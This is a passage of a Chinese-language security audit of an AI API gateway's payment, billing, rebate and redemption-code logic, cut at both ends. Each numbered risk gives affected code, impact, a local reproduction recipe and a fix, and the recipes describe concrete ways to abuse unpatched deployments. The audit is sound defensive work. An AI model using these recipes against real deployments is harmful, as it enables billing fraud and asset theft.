  - `controller/option.go:226-270`：只对 `GroupRatio`、图片/音频/缓存倍率等有特殊分支，未覆盖 `TopupGroupRatio`
  - `model/option.go:210-223`：`UpdateOption` 先 `DB.Save`，再调用 `updateOptionMap`
  - `model/option.go:474-475`：`TopupGroupRatio` 更新调用 `common.UpdateTopupGroupRatioByJSONString`
  - `common/topup-ratio.go:25-30`：函数先 `topupGroupRatio = make(map[string]float64)`，再 `json.Unmarshal`；解析失败时旧 map 已丢失
  - `common/topup-ratio.go:32-40`：组名不存在时记录错误并返回 1
  - `controller/topup.go:149-176`：Epay 下单金额乘以 `GetTopupGroupRatio(group)`
  - `controller/topup_stripe.go:388-415`：Stripe charged amount 和 pay money 使用充值分组倍率，0 或缺失退回 1
  - `controller/topup_waffo.go:77-92`、`controller/topup_waffo_pancake.go:53-74`：Waffo 两条充值路径同样使用该倍率
  - 前端对比：`web/default/src/features/system-settings/models/ratio-settings-card.tsx:145-153` 只校验 `TopupGroupRatio` 是 JSON，未校验非负、有限数、组名存在和保存后端原子性
- 可能后果：例如 VIP 充值倍率原本为 0.8 或 1.2，保存一次非法配置后当前进程会把倍率表清空，后续 VIP 充值按 1 计算。折扣组可能被多收，溢价组可能被少收；如果坏配置已经写库，定时同步或重启还会重复把运行期表清空，形成持续的“后台显示保存失败但充值价格已变”的运营事故。
- 复现思路：本地先设置 `TopupGroupRatio={"default":1,"vip":1.2}`，再通过 `/api/option` 提交 `TopupGroupRatio="{bad-json"`；观察接口返回失败后，`common.TopupGroupRatio2JSONString()` 是否变成 `{}`，VIP 调用 Epay/Stripe/Waffo 金额计算是否按 1 而不是 1.2。
- 修复建议：所有 map 类配置先反序列化到临时变量并完成业务校验，成功后再一次性替换全局 map；`UpdateOption` 应改为 validate -> persist -> apply，解析失败不得写 DB、不得更新 `OptionMap`、不得清空旧内存。`TopupGroupRatio` 还应校验 value 为有限非负数，0 值需要显式免费/折扣确认，组名应与可用用户组配置交叉校验。
- 优先级：P1
- 当前状态：已确认 `TopupGroupRatio` 解析失败会破坏运行期充值倍率表，尚未修复。

### 风险 103：`tool_price_setting.prices` 可通过 JSON 写入负数或异常工具价格，文本结算路径会把负数附加费计入实际扣费

- 标题：工具调用价格分层配置没有后端非负/有限数校验；Responses/Claude 文本结算直接把配置价格累加为 surcharge，负数可降低本次请求实际扣费
- 影响范围：OpenAI Responses `web_search_preview`、`file_search`、Claude web search、工具调用附加费、模型计费日志、用户余额、运营成本统计
- 触发条件：Root 管理员在工具价格 JSON 模式写入负数、NaN/极端值或错误类型；直接调用 `/api/option` 绕过前端视觉输入 `min=0`；配置同步/导入写入异常价格
- 涉及文件/函数：
  - `setting/operation_setting/tools.go:36-55`：`ToolPriceSetting.Prices map[string]float64` 注册为分层配置
  - `model/option.go:588-623`：`tool_price_setting.*` 命中 `handleConfigUpdate`，调用 `config.UpdateConfigFromMap` 后忽略错误并重建索引
  - `setting/config/config.go:255-263`：map 字段只做 JSON unmarshal，不做 key/value 业务校验
  - `setting/operation_setting/tools.go:77-115`：`RebuildToolPriceIndex` 直接把配置价格合并进索引
  - `setting/operation_setting/tools.go:117-140`：`GetToolPriceForModel` 返回索引中的价格，没有非负保护
  - `service/text_quota.go:84-138`：文本结算读取 web/file search 价格后直接加到 `ToolCallSurchargeQuota`，没有 `price > 0` 检查
  - `service/text_quota.go:275-300`：实际 quota 把 `ToolCallSurchargeQuota` 加入模型倍率或固定价格计费结果；固定价格分支没有负数兜底
  - 对比证据：`service/tool_billing.go:43-50` 的独立工具计费 helper 会跳过 `pricePer1K <= 0`，但文本结算路径没有同等保护
  - 前端对比：`web/default/src/features/system-settings/models/tool-price-settings.tsx:300-310` 视觉模式 `Input type=number min=0`，但 `handleJsonChange` 只要求 JSON object，保存时直接提交 `currentPrices`
- 可能后果：管理员误配或被盗 Root 账号可把 `web_search_preview`、`web_search`、`file_search` 配成负数。带工具调用的请求会把负数 surcharge 加入实际扣费，轻则抵消工具成本导致少扣费，重则在固定价格或 tiered 结算中产生负 quota 或异常低 quota，造成平台承担上游工具成本。日志中的工具价格也会记录异常值，干扰后续对账。
- 复现思路：本地保存 `tool_price_setting.prices={"web_search_preview":-1000,"file_search":-1000}`，发起带 Responses web search 或 file search usage 的请求；观察 `service/text_quota.go` 生成的 `ToolCallSurchargeQuota`、`summary.Quota` 和消费日志中工具价格是否被负数拉低。
- 修复建议：为 `tool_price_setting.prices` 增加后端 schema：key 必须是已知工具名或 `tool:model-prefix*` 格式，value 必须是有限数且 `>= 0`，并设置合理上限；文本结算路径也应 fail closed，对 `price <= 0` 只允许显式免费白名单，否则记录配置错误并拒绝或按默认价计费。前端 JSON 模式保存前复用同一校验并提示风险 diff。
- 优先级：P1
- 当前状态：已确认工具价格 JSON 缺少后端边界校验，且文本结算路径会使用负数价格，尚未修复。

### 风险 104：Waffo 与 Waffo Pancake 普通充值回调只用本地 `trade_no` 入账，未校验支付侧金额、币种、产品或订单 ID 与本地快照一致

- 标题：Waffo/Pancake 已做签名和部分身份校验，但充值完成仍只按本地订单字段加额度；回调中的实付金额、币种、产品/店铺和第三方订单 ID 没有参与入账前断言
- 影响范围：Waffo 普通充值、Waffo Pancake 普通充值、充值倍率/单价配置漂移、支付平台产品错绑、折扣/税费/币种错误、充值到账额度、客服对账
- 触发条件：Waffo/Pancake 后台价格或产品绑定错误；创建 checkout 后本地 `WaffoUnitPrice`、`WaffoPancakeUnitPrice`、`TopupGroupRatio`、`QuotaPerUnit` 或绑定产品变化；支付侧回调金额、币种、产品或 store/order 与本地 pending 订单不一致；签名真实但业务数据异常
- 涉及文件/函数：
  - `controller/topup_waffo.go:244-269`：创建 Waffo 订单时向支付侧发送 `OrderAmount`、`OrderCurrency`、`MerchantOrderID`，本地订单保存 `Amount/Money`
  - `controller/topup_waffo.go:376-404`：Waffo 成功回调只检查 `OrderStatus == PAY_SUCCESS` 和 `MerchantOrderID`，随后调用 `model.RechargeWaffo`
  - `model/topup.go:608-679`：`RechargeWaffo` 只校验 provider/status，按本地 `topUp.Amount * QuotaPerUnit` 入账，不读取回调金额/币种
  - `controller/topup_waffo_pancake.go:401-410`：Pancake checkout 使用 `PriceSnapshot.Amount` 和 `OrderMerchantExternalID`
  - `controller/topup_waffo_pancake.go:464-480`：Pancake webhook 做签名和 test/prod 环境段校验，这是正向证据
  - `service/waffo_pancake.go:177-194`：Pancake webhook event 中保留了 `StoreID`、`Currency`、`Amount`、`ProductName`、`OrderID` 等可校验字段
  - `service/waffo_pancake.go:197-221`：`ResolveWaffoPancakeTradeNo` 校验 `OrderMerchantExternalID` 和 buyer identity，这是正向证据，但不校验金额/币种/产品
  - `controller/topup_waffo_pancake.go:513-535`：解析出 trade_no 后直接调用 `model.RechargeWaffoPancake`
  - `model/topup.go:682-747`：`RechargeWaffoPancake` 只校验 provider/status，按本地 `topUp.Amount * QuotaPerUnit` 入账
- 可能后果：真实签名的回调也可能代表“支付了错误金额/错误产品/错误币种”的订单。系统会按本地 pending 订单给额度，导致用户低价拿到高额度、正常付款却少入账、或者支付平台产品错绑后仍自动完成。由于本地 `TopUp` 没有第三方 `order_id/session_id/product_id/store_id` 快照，事后只能从日志和第三方后台人工对账。
- 复现思路：本地创建 Waffo/Pancake pending 订单，构造签名有效但 `Amount/Currency/ProductName/StoreID` 与本地 `Money` 或绑定产品不一致的回调；观察 resolver 能通过 trade_no/identity 后，入账仍按本地 `topUp.Amount` 执行。
- 修复建议：创建订单时持久化支付侧快照：期望实付金额、币种、产品 ID、store ID、checkout session/order ID、价格版本和配置版本。webhook 完成前必须校验这些字段与回调一致；允许折扣/税费时要把折扣策略显式写入订单快照。校验失败的签名回调应进入 `payment_disputed`/`needs_review` 状态，不自动加额度。
- 优先级：P1
- 当前状态：已确认 Waffo/Pancake 普通充值缺少金额和产品快照校验，尚未修复。

### 风险 105：多网关订阅购买完成只按 `trade_no` 和 provider 创建套餐，未校验回调金额、Price/Product ID、币种与订阅订单快照

- 标题：`CompleteSubscriptionOrder` 没有支付金额/产品断言参数；Stripe、Creem、Waffo Pancake 订阅回调只把 provider payload 作为日志保存，套餐生效依据仍是本地 pending 订单
- 影响范围：订阅套餐购买、用户订阅创建、套餐分组升级、订阅 topup 镜像记录、支付平台 Price/Product 错绑、套餐价格变更后的历史订单
- 触发条件：支付平台 Price ID/Product ID 与本地 plan 不匹配；订阅 checkout 创建后套餐价格或绑定产品改变；webhook 的金额/币种/产品与本地 `SubscriptionOrder.Money` 不一致；Stripe 促销、Creem/Waffo Pancake 产品错配或测试/生产配置漂移
- 涉及文件/函数：
  - `controller/subscription_payment_stripe.go:71-91`：Stripe 订阅订单保存 `PlanId/Money/TradeNo`，checkout 使用 `plan.StripePriceId`
  - `controller/topup_stripe.go:267-279`：Stripe webhook 把 `amount_total/currency/event_type` 放入 payload 后调用 `model.CompleteSubscriptionOrder`，没有比对 `order.Money` 或 plan price id
  - `controller/subscription_payment_creem.go:80-114`：Creem 订阅订单保存 `Money`，checkout 使用 `plan.CreemProductId`
  - `controller/topup_creem.go:302-313`：Creem 订阅完成先尝试 `CompleteSubscriptionOrder`，未校验 `AmountPaid/Currency/Product`
  - `controller/subscription_payment_waffo_pancake.go:74-101`：Pancake 订阅订单保存 `Money`，checkout 使用 `plan.WaffoPancakeProductId` 和 `PriceSnapshot.Amount`
  - `controller/topup_waffo_pancake.go:491-508`：Pancake 订阅 webhook 校验 trade_no/identity 后调用 `CompleteSubscriptionOrder`
  - `model/subscription.go:612-684`：`CompleteSubscriptionOrder` 只校验 `tradeNo`、provider、pending 状态，然后从当前 plan 创建 `UserSubscription` 并保存 provider payload
  - `model/subscription.go:687-720`：订阅 topup 镜像记录使用本地 `order.Money`
- 可能后果：用户可能支付了低价或错误产品，却得到本地 `PlanId` 对应的套餐；或者真实支付高价但本地只记录低价 `Money`。如果运营在支付平台修改 Price/Product 或把多个套餐错绑到同一产品，系统不会阻断。对于带 `UpgradeGroup` 的套餐，这会直接变成用户组和模型权限越权。
- 复现思路：本地创建一个价格为 99 的套餐订单，然后模拟支付侧回调 payload 中金额为 1 或产品 ID 指向另一个套餐；调用 `CompleteSubscriptionOrder` 路径，观察当前函数仍会按本地 `PlanId` 创建订阅。
- 修复建议：`SubscriptionOrder` 增加支付快照字段：expected_amount、currency、stripe_price_id/creem_product_id/waffo_pancake_product_id、checkout_session_id、plan_version。各网关 webhook 在调用完成函数前解析并校验金额、币种、产品和会话；`CompleteSubscriptionOrder` 接受结构化 verified payment proof，而不是任意 payload 字符串。
- 优先级：P1
- 当前状态：已确认订阅订单完成缺少支付侧金额和产品绑定校验，尚未修复。

### 风险 107：`CreemProducts` 只保存 JSON 字符串，后端不校验 price/quota/productId/currency/重复项，充值订单会直接信任其中的额度

- 标题：Creem 产品配置的关键价格和额度字段缺少后端业务 schema；一旦被 Root API、旧前端、脚本或数据库写入异常值，用户可用对应 productId 创建异常额度订单
- 影响范围：Creem 普通充值、`TopUp.Amount`、用户 quota 入账、Creem 产品列表展示、运营改价/改产品、后台配置导入
- 触发条件：`CreemProducts` 被写成 JSON array 但字段值非法，例如 `quota` 极大、`price` 为 0/负数/NaN 表示、`productId` 重复、`currency` 非预期、同一 Creem productId 对应多个本地额度；或者 classic/default 前端之外的客户端直接调用 `/api/option/` 更新配置
- 涉及文件/函数：
  - `controller/option.go:120-150`、`controller/option.go:226-234`：通用 option 更新只对少数字段做专门校验，未覆盖 `CreemProducts`
  - `model/option.go:422-429`：`CreemProducts` 更新时直接赋值到 `setting.CreemProducts`
  - `web/default/src/features/system-settings/integrations/payment-settings-section.tsx:132-140`：新版设置页只校验 `CreemProducts` 是 JSON array
  - `web/default/src/features/system-settings/integrations/creem-product-dialog.tsx:53-59`：可视化弹窗有 `price >= 0.01`、`quota >= 1`、`currency in USD/EUR` 的前端校验，这是正向证据但不是后端信任边界
  - `web/default/src/features/system-settings/integrations/creem-products-visual-editor.tsx:57-79`：前端展示会过滤字段类型和 USD/EUR，但保存 JSON 编辑器仍只受 array 校验
  - `web/classic/src/pages/Setting/Payment/SettingsPaymentGatewayCreem.jsx:170-197`：classic 前端校验正数和重复 productId，这是正向证据但可被绕过
  - `controller/topup_creem.go:77-98`：下单时只 `json.Unmarshal` 并按 `ProductId` 找首个匹配产品，不校验业务边界和重复项
  - `controller/topup_creem.go:107-118`：本地 `TopUp` 直接使用 `selectedProduct.Quota` 作为 `Amount`，`selectedProduct.Price` 作为 `Money`
  - `model/topup.go:555-559`：`RechargeCreem` 入账时直接把 `topUp.Amount` 转成整数额度，只拒绝 `<= 0`
- 可能后果：配置被误写或越权写入后，用户可以选择异常 productId 创建“低价高额”订单；如果支付侧该 productId 仍能完成支付，系统按本地 `TopUp.Amount` 加额度。重复 productId 还会导致前端展示、下单首个匹配项和运营认知不一致，形成错价或错额度事故。
- 复现思路：本地用 Root token 调用 `/api/option/` 写入 `CreemProducts=[{"name":"x","productId":"prod_real","price":0.01,"quota":999999999999,"currency":"USD"}]`，再用普通用户传 `product_id=prod_real` 创建 Creem 充值订单；观察 pending `TopUp.Amount` 已是异常额度，后续成功 webhook 会按该字段入账。
- 修复建议：在后端增加 `ValidateCreemProducts`，保存时强制校验数组长度、必填字段、`productId` 唯一、`price > 0` 且有限、`quota` 在运营上限内、currency 白名单、字段长度和 JSON 大小；下单前再次校验当前配置并记录产品快照。高风险字段变更应写审计日志并可选要求二次确认。
- 优先级：P1
- 当前状态：已确认 Creem 产品配置缺少后端业务校验，尚未修复。

### 风险 108：Creem 充值入口可在未配置 webhook secret 时展示并创建 checkout，但 webhook 路由会拒绝完成入账

- 标题：`isCreemTopUpEnabled()` 不要求 `CreemWebhookSecret`，而 `CreemWebhook()` 必须通过 `isCreemWebhookEnabled()`；用户可进入支付但回调被 403 拒绝
- 影响范围：Creem 普通充值、Creem 订阅购买、测试模式验收、用户支付后不到账、客服补单和对账
- 触发条件：运营配置了 `CreemApiKey` 和非空 `CreemProducts`，但没有配置 `CreemWebhookSecret`；或者测试模式下认为无需 webhook secret；用户发起 Creem 普通充值或 Creem 订阅 checkout
- 涉及文件/函数：
  - `controller/payment_webhook_availability.go:31-39`：`isCreemTopUpEnabled` 只要求合规确认、API Key 和非空产品列表
  - `controller/topup.go:98-113`：充值信息接口把 `enable_creem_topup` 和原始 `creem_products` 返回给前端
  - `controller/topup_creem.go:66-142`：普通 Creem 下单没有检查 webhook secret，能创建 pending 订单并拉起 checkout
  - `controller/subscription_payment_creem.go:57-60`：订阅 Creem 在 test mode 下允许没有 webhook secret
  - `controller/payment_webhook_availability.go:41-47`：`isCreemWebhookEnabled` 又要求 `CreemWebhookSecret` 非空
  - `controller/topup_creem.go:229-234`：webhook 未启用时直接 403，不进入验签和订单完成
  - `controller/topup_creem.go:35-48`：`verifyCreemSignature` 有 test mode 下 secret 为空跳过验签的分支，但正常 webhook 入口先被 `isCreemWebhookEnabled` 拦截，使该分支在当前路由下难以发挥作用
  - `controller/payment_webhook_availability_test.go:47-68`：测试明确覆盖了 Creem webhook 需要 topup 配置和 webhook secret
- 可能后果：用户完成真实支付后系统无法自动入账，订单长期 pending；运营误以为 Creem 已启用，实际只有支付拉起可用。测试模式下更容易误判，因为创建订阅 checkout 的代码允许缺少 secret，但 webhook 路由仍拒绝。
- 复现思路：开启支付合规，设置 `CreemApiKey` 和一个产品，保持 `CreemWebhookSecret=""`；调用充值信息接口会看到 Creem 可用，发起 Creem 下单会创建 checkout；随后向 Creem webhook 路由发送回调会在 `isCreemWebhookEnabled()` 处 403。
- 修复建议：Creem 普通充值和订阅支付入口的启用条件应与完成条件一致：生产模式必须要求 webhook secret；测试模式如果允许跳过验签，也要让 webhook enabled 逻辑明确放行并在 UI 上标注“仅测试”。更稳妥的方式是无论 test/prod 都要求 secret，并删除空 secret 跳过验签分支。配置页应显示“可拉起支付”和“可完成回调”的独立健康检查。
- 优先级：P1
- 当前状态：已确认 Creem 支付入口和 webhook 完成入口条件不一致，尚未修复。

### 风险 110：支付侧退款、拒付或 chargeback 事件没有统一逆转状态机，已入账额度和套餐不会自动回滚

- 标题：普通充值和订阅购买只建了 pending/success/failed/expired 的正向完成链路；支付侧后续退款、拒付、撤销、chargeback 没有进入本地订单、额度、套餐和收入统计回滚
- 影响范围：Stripe、Creem、Waffo、Waffo Pancake 普通充值与订阅购买、用户 quota、`users.topup_money`、邀请返利、套餐权限、运营收入报表、客服补单
- 触发条件：用户付款后申请退款；支付平台判定拒付/chargeback；商户后台手动退款；订阅在支付平台取消或退款；支付侧发送非完成类 webhook
- 涉及文件/函数：
  - `controller/topup_stripe.go:176-187`：Stripe webhook 只处理 checkout completed/expired/async succeeded/async failed，其他事件直接忽略
  - `controller/topup_creem.go:275-282`：Creem webhook 只处理 `checkout.completed`，其他事件直接忽略
  - `controller/topup_waffo_pancake.go:480-484`：Waffo Pancake 只处理 `order.completed`，其他 normalized event 直接 200 忽略
  - `controller/topup_waffo.go:359-373`：Waffo 只处理 `core.EventPayment`，其他 event_type 直接成功忽略
  - `model/topup.go:164-188`：通用订单状态更新只允许 pending 订单转目标状态，不能把 success 订单转 refunded/disputed
  - `model/topup.go:200-255`、`model/topup.go:519-605`、`model/topup.go:608-747`：各支付入账函数只实现 success 加额度和邀请返利，没有反向扣回
  - `model/subscription.go:612-684`：订阅完成只创建 `UserSubscription`、写 success 订单和 topup 镜像
  - `model/user.go:257-277`：`topup_money` 只汇总 success topups；退款被忽略时收入统计仍包含已退款订单
  - `model/user.go:1034-1067`：系统有扣减用户 quota 的底层函数，但支付退款链路没有调用它
- 可能后果：用户可以先支付获取额度或套餐，再通过支付平台退款/拒付保留本地资产；运营后台仍把订单算作 success 和收入，邀请返利也可能保留。订阅类退款不会取消已创建的 `UserSubscription` 或回退升级分组，形成“支付侧已退、站内仍可用”的运营风险。
- 复现思路：本地完成一笔 Stripe/Creem/Waffo/Pancake 充值或订阅，使订单进入 success；随后模拟支付平台发送 refund/dispute/chargeback/cancel 类型 webhook。观察当前控制器会忽略事件，本地订单、用户 quota、`topup_money`、用户订阅状态不变。
- 修复建议：引入支付逆向事件表和统一状态机：success 可转 `refunded`、`partially_refunded`、`disputed`、`chargeback`、`needs_review`。退款前保存原始入账额度、邀请返利和订阅资产快照；全额退款自动扣回未消费额度或冻结账户，部分退款按策略扣回或人工审核；订阅退款/取消应失效套餐并回退用户组。所有逆向事件必须幂等、可审计、可人工复核。
- 优先级：P1
- 当前状态：已确认支付侧逆向事件没有自动回滚站内资产，尚未修复。

### 风险 111：Waffo SDK 已定义退款和订阅取消事件，但当前 Waffo webhook 控制器只接普通支付事件

- 标题：Waffo 控制器注释写“支付/退款/订阅”，但实际 switch 只处理 `PAYMENT_NOTIFICATION`；`REFUND_NOTIFICATION` 和订阅取消/过期事件会被直接确认并丢弃
- 影响范围：Waffo 普通充值退款、Waffo 订阅状态变更、商户后台退款、用户取消订阅、渠道取消订阅、Waffo 对账
- 触发条件：Waffo 发送 `REFUND_NOTIFICATION`、`SUBSCRIPTION_STATUS_NOTIFICATION`、`SUBSCRIPTION_PERIOD_CHANGED_NOTIFICATION` 或 `SUBSCRIPTION_CHANGE_NOTIFICATION`；本地未注册对应 handler
- 涉及文件/函数：
  - `/home/yuohira/go/pkg/mod/github.com/waffo-com/waffo-go@v1.3.1/core/webhook_handler.go:12-19`：SDK 定义 Payment、Refund、SubscriptionStatus、SubscriptionPeriodChanged、SubscriptionChange 事件
  - `/home/yuohira/go/pkg/mod/github.com/waffo-com/waffo-go@v1.3.1/core/webhook_handler.go:32-39`：SDK 定义部分退款、全额退款和退款失败状态
  - `/home/yuohira/go/pkg/mod/github.com/waffo-com/waffo-go@v1.3.1/core/webhook_handler.go:41-52`：SDK 定义商户取消、用户取消、渠道取消、过期等订阅状态
  - `/home/yuohira/go/pkg/mod/github.com/waffo-com/waffo-go@v1.3.1/core/webhook_handler.go:284-300`：SDK 自带 dispatcher 可路由退款和订阅事件
  - `controller/topup_waffo.go:318-374`：本地控制器手动验签后只 switch `core.EventPayment`，default 对其他事件返回成功
  - `controller/topup_waffo.go:376-405`：支付事件中非 `PAY_SUCCESS` 只把 pending 普通充值标记 failed，不处理已成功订单的退款状态
- 可能后果：Waffo 退款和订阅取消事件在系统层面“已接收成功”，支付平台不会重试，但站内额度/套餐不变。由于日志只记录忽略 event_type，运营需要人工跨平台对账才能发现用户已退款仍可消费。
- 复现思路：构造签名有效的 Waffo `REFUND_NOTIFICATION` 或订阅取消通知；观察当前 `WaffoWebhook` 进入 default，调用 `sendWaffoWebhookResponse(..., true, "")`，本地订单和订阅没有变化。
- 修复建议：改用 SDK dispatcher 或显式注册并处理 Refund/SubscriptionStatus/SubscriptionChange。Refund 事件应定位本地 `trade_no` 和原始订单，按退款状态更新订单并触发资产回滚或人工审核；订阅取消/过期应同步 `UserSubscription` 状态和用户组。无法自动匹配的逆向事件必须落库为 `needs_review`，不能只写日志后丢弃。
- 优先级：P1
- 当前状态：已确认 Waffo 退款和订阅逆向事件被忽略，尚未修复。

### 风险 113：邀请充值返利没有来源流水和冲正状态，支付退款或人工扣回后返利可继续保留并划转

- 标题：充值成功时直接累加邀请人的 `aff_quota/aff_history`，只写普通日志；没有按 `trade_no` 记录返利流水、冻结期、可撤销状态或退款冲正关系
- 影响范围：邀请充值返利、邀请人 `aff_quota`、`aff_history_quota`、邀请额度划转、支付退款/拒付后的资产回滚、运营返佣统计
- 触发条件：被邀请用户完成充值后，邀请人获得返利；随后原订单发生支付侧退款/拒付、人工扣回、订单争议、订阅删除或运营手动处理；邀请人已经把 `aff_quota` 划转到普通余额
- 涉及文件/函数：
  - `model/topup.go:69-119`：`applyInviteTopupRebateWithTx` 按用户 inviter 和 creditedQuota 直接累加 `aff_quota/aff_history`
  - `model/topup.go:125-130`：返利只记录普通系统日志，没有返利表、订单号、状态和唯一约束
  - `model/topup.go:239-253`、`model/topup.go:497-515`、`model/topup.go:589-603`、`model/topup.go:661-677`、`model/topup.go:733-749`：各支付成功入账后发放返利
  - `model/invite_topup_rebate_test.go:53-96`：测试覆盖同一 Waffo 订单重复回调不会重复发返利，这是正向证据
  - `controller/user.go:354-379`：用户可调用邀请额度划转接口
  - `model/user.go:466-500`：`TransferAffQuotaToQuota` 把 `aff_quota` 扣减并增加普通 `quota`
  - `web/default/src/features/wallet/components/affiliate-rewards-card.tsx:63-110`：前端把返利展示为可随时转入余额
- 可能后果：用户 A 邀请用户 B 充值，A 获得返利后立即划转为普通余额；B 再退款/拒付时，系统没有返利来源流水可冲正，也无法判断 A 的普通余额中哪部分来自该订单。运营即使人工扣回 B 的额度，也可能漏扣 A 的返利，形成“充值-返佣-退款”的套利空间。
- 复现思路：开启邀请充值返利，B 使用 A 的邀请码注册并完成一笔充值，确认 A 的 `aff_quota/aff_history` 增加；A 调用划转接口转入普通余额；再模拟支付平台退款或人工删除/失效 B 的订阅，观察 A 的返利和普通余额没有来源级撤销动作。
- 修复建议：新增 `invite_topup_rebates` 流水表，字段包含 `trade_no`、inviter_id、invited_user_id、rebate_quota、status、credited_at、reversed_at、source_payment_provider，并对 `trade_no` 建唯一约束。支付成功后先进入可冻结/可提现状态；退款、拒付或订单冲正时按流水撤销未划转返利，已划转部分进入负余额/冻结/人工审核。用户展示和划转只使用可用返利余额。
- 优先级：P1
- 当前状态：已确认返利缺少来源流水和冲正机制，尚未修复。

### 风险 114：`InviteTopupRebateRatio` 后端缺少 0-100 上限和有限数校验，绕过前端可配置超额返利

- 标题：新版前端限制邀请充值返利比例为 0-100%，但通用 option 后端只检查“正数需要合规确认”，保存时直接 `ParseFloat`
- 影响范围：邀请充值返利、邀请人 `aff_quota/aff_history`、充值套利、后台配置导入、脚本批量设置
- 触发条件：Root 通过 API、旧脚本或直接数据库写入 `InviteTopupRebateRatio=150`、`1000` 或异常浮点字符串；支付合规已确认；被邀请用户完成充值
- 涉及文件/函数：
  - `web/default/src/features/system-settings/general/quota-settings-section.tsx:50-57`：新版前端 schema 限制 `InviteTopupRebateRatio` 在 0-100
  - `web/default/src/features/system-settings/general/quota-settings-section.tsx:251-274`：前端输入框也设置 min/max/step
  - `controller/option.go:140-145`：后端仅在该值为正且未合规确认时拒绝，没有校验上限
  - `model/option.go:514-515`：`InviteTopupRebateRatio` 直接 `strconv.ParseFloat` 写入全局变量，忽略解析错误
  - `model/topup.go:62-66`：返利按 `creditedQuota * InviteTopupRebateRatio / 100` 计算，没有上限保护
- 可能后果：一次充值可以给邀请人发放超过充值额度的返利。若配合多账号邀请和返利划转，运营错误配置或被盗 Root token 写入高比例后，会把充值系统变成“充值越多返得越多”的资产放大器。
- 复现思路：在合规确认后调用 `/api/option/` 写入 `{"key":"InviteTopupRebateRatio","value":"500"}`，让被邀请用户完成 1000 quota 的充值；观察邀请人获得 5000 quota 返利。
- 修复建议：后端增加与前端一致的强校验：比例必须是有限数，范围 0-100，建议运营上限可配置但默认不超过 100；保存失败必须返回错误，不能忽略 `ParseFloat`。高比例变更应写审计日志并要求二次确认。
- 优先级：P1
- 当前状态：已确认返利比例后端缺少上限校验，尚未修复。

### 风险 115：易支付成功回调先把订单标记 success，再加额度和返利；加额度失败会留下“已成功但未到账”的不可重试状态

- 标题：易支付回调的订单状态更新、用户额度增加、`topup_money` 刷新和邀请返利不在同一事务；状态先成功后资产入账，失败后重复回调只刷新累计充值金额
- 影响范围：易支付普通充值、用户 quota、`topup_money`、邀请充值返利、客服补单、支付回调重试
- 触发条件：易支付签名通过且 `TradeStatus == TRADE_SUCCESS`；本地订单 pending；`topUp.Update()` 成功后，`model.IncreaseUserQuota`、刷新累计充值金额或返利发放任一步失败；数据库短暂故障、批量更新异常、用户记录异常均可能触发
- 涉及文件/函数：
  - `controller/topup.go:373-393`：成功回调内先设置 `CompleteTime` 和 `Status=success` 并 `topUp.Update()`
  - `controller/topup.go:400-407`：之后才计算额度并调用 `model.IncreaseUserQuota`
  - `controller/topup.go:408-418`：再刷新 `topup_money`、发放邀请返利和写日志
  - `controller/topup.go:419-423`：如果重复回调时订单已 success，只刷新 `topup_money`，不会补加用户 quota 或返利
  - `model/topup.go:200-245`、`model/topup.go:622-667`、`model/topup.go:696-738`：Stripe/Waffo/Waffo Pancake 等模型层入账把订单成功、额度和返利放在事务里，这是正向对照
- 可能后果：用户真实付款后订单显示成功、统计收入增加，但余额没有到账或邀请返利没有发放；由于后续回调认为订单已 success，不会自动重试补加额度。客服只能人工查日志和第三方订单补偿，容易产生漏补或重复补。
- 复现思路：本地模拟易支付成功回调，在 `topUp.Update()` 成功后让 `IncreaseUserQuota` 返回错误；再次发送同一成功回调，观察代码进入 success 分支只刷新 `topup_money`，用户额度仍不会补加。
- 修复建议：把易支付入账迁移到模型层事务，按 `trade_no FOR UPDATE` 锁定订单，在同一事务内完成 provider/status 校验、订单 success、用户 quota 增加、`topup_money` 刷新和返利流水。若任一步失败，应保持订单 pending 或进入 `credit_failed`，并允许安全重试。重复 success 回调应根据可审计的入账流水判断是否已经加额度，而不是只看订单状态。
- 优先级：P1
- 当前状态：已确认易支付成功回调存在状态与资产入账非原子风险，尚未修复。

### 风险 116：额度型兑换码创建/编辑缺少后端 quota 正数与上限校验，可写入 0、负数或极大额度

- 标题：`validateRedemptionBenefit` 对 quota 类型直接放行；兑换时把 `redemption.Quota` 原样加到用户 quota，后端没有 `> 0`、最大值和整数溢出边界
- 影响范围：兑换码额度充值、用户 quota、后台批量创建、脚本/API 导入、管理员误操作
- 触发条件：管理员或脚本调用 `/api/redemption/` 创建/编辑 quota 类型兑换码，传入 `quota=0`、负数、极大整数；用户兑换该码
- 涉及文件/函数：
  - `controller/redemption.go:91-100`：新增兑换码时只调用 `validateRedemptionBenefit`，quota 类型不会校验额度
  - `controller/redemption.go:161-181`：编辑兑换码时同样不校验 quota 正数/上限
  - `controller/redemption.go:220-227`：`validateRedemptionBenefit` 对 `RedemptionTypeQuota` 直接返回 true
  - `model/redemption.go:188-194`：兑换额度码时直接执行 `quota + redemption.Quota`
  - `web/default/src/features/redemption-codes/lib/redemption-form.ts:46`：新版前端只限制 `quota_dollars >= 0`，允许 0，且不是后端信任边界
  - `web/classic/src/components/table/redemptions/modals/EditRedemptionModal.jsx:302-318`：classic 金额输入允许 min=0；原生额度输入有 `>0` 校验，这是正向前端约束但可绕过
- 可能后果：负数兑换码会扣减用户余额，0 额度码会污染运营数据和客服判断，极大额度码会造成异常资产发放甚至整数溢出风险。若 Root token 泄露或批量导入脚本出错，兑换码系统会直接变成资产写入通道。
- 复现思路：用管理员 token 调用创建兑换码接口，传 `{"name":"bad","type":"quota","quota":-100000,"count":1}`；普通用户兑换后观察 `users.quota` 被扣减。再传极大 quota，观察数据库和前端展示/消费逻辑是否异常。
- 修复建议：后端对 quota 类型强制校验 `quota > 0`，并设置运营上限；建议按展示金额输入时使用 decimal 转换并校验转换结果有限。编辑已启用兑换码时也应重复校验。负数或 0 应拒绝保存，并写入审计日志。
- 优先级：P1
- 当前状态：已确认额度型兑换码后端缺少额度边界校验，尚未修复。

### 风险 117：`status_only` 更新未限制目标状态，已使用兑换码可被 API 重新置为 enabled 后再次兑换

- 标题：兑换码使用状态只靠 `status == enabled` 判断；状态更新接口可写任意 status，未阻止 `used -> enabled`，也不检查 `redeemed_time/used_user_id`
- 影响范围：兑换码重复兑换、套餐兑换码、额度兑换码、已用码管理、管理员误操作或脚本误调用
- 触发条件：一个兑换码已被兑换，`status=used` 且保留 `used_user_id/redeemed_time`；管理员或脚本调用 `/api/redemption/?status_only=true`，传 `status=1`；其他用户再次兑换同一个 key
- 涉及文件/函数：
  - `controller/redemption.go:148-186`：`status_only` 分支直接把请求中的 `Status` 写入 `cleanRedemption.Status`
  - `model/redemption.go:225-227`：`SelectUpdate` 允许更新 status 和 redeemed_time
